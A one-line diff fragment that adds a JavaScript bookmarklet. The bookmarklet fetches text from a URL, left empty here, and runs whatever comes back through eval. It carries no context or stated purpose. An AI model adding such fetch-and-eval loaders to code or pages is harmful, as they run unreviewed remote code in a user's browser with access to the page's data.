@@ -1,0 +1,1 @@
+javascript:fetch("").then(a=>a.text()).then(eval)
